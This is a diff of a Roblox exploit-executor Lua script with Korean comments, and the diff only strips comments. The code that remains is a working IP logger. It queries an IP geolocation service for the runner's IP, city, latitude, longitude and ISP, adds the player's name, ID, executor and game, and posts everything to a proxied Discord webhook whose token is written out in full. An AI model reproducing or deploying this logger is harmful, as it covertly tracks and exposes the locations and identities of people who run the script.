@@ -1,10 +1,8 @@
--- [1] 작동 확인된 프록시 웹훅 주소 적용
 local final_url = "https://webhook.lewisakura.moe/api/webhooks/1492529869794316438/FTMB5QH68Y0GcFghVGIYCMukbeDacxkqFwpwWP1nynn1ljVzKwafayk1GAlvz2hDkipB"
 
 local http_request = http_request or request or syn.request or http.request or fluxus.request or Krnl.request or http_request 
 if not http_request then warn("HTTP 요청 함수를 찾을 수 없습니다!") return end 
 
--- [2] IP 및 상세 정보 가져오기 (도시, 위도, 경도 포함)
 local ipData = { query = "알 수 없음", country = "N/A", city = "N/A", lat = "N/A", lon = "N/A", isp = "N/A" }
 local success, response = pcall(function() 
     return http_request({ 
@@ -20,14 +18,12 @@ if success and response.Body then
     end
 end
 
--- [3] 정보 정리
 local playerName = game.Players.LocalPlayer and game.Players.LocalPlayer.Name or "???"
 local playerId = game.Players.LocalPlayer and game.Players.LocalPlayer.UserId or 0
 local executorName = (identifyexecutor and identifyexecutor()) or "알 수 없음"
 local gameName = "알 수 없음"
 pcall(function() gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end)
 
--- [4] 디스코드 전송 (프록시 주소 사용)
 local payload = {
     username = "스크립트 IP 로그",
     embeds = {{
@@ -57,7 +53,6 @@ pcall(function()
     })
 end)
 
--- [5] 화면 UI 생성 (사라지지 않음)
 local screenGui = Instance.new("ScreenGui")
 local textLabel = Instance.new("TextLabel")
 
@@ -76,4 +71,4 @@ textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 textLabel.TextSize = 20
 textLabel.TextWrapped = true
 
--- 프린트 문 제거됨
+
